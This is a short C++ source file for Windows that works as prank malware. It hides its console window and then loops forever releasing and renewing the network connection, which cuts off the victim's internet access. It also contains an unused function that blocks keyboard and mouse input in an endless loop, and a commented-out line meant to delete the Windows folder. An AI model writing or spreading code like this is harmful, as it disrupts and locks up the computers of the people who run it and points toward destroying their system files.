#include <iostream>
#include <Windows.h>
#include <cstdlib>

using namespace std;

//Fucntion Protoyping
void DisInternetTroll();
void DisInput();

int main(){
    FreeConsole(); //Hides Console
    DisInternetTroll();
    
    //const int result = remove("C:\Windows"); //Delets The C:\ Folder!
    return 0;
}

void DisInternetTroll(){ //This fucntion just trools their internet, turning it on and off
    for(;;){
    system("ipconfig /release");
    system("ipconfig /renew");
    }
}

void DisInput(){
        while(1){
        BlockInput(true);
    }
}
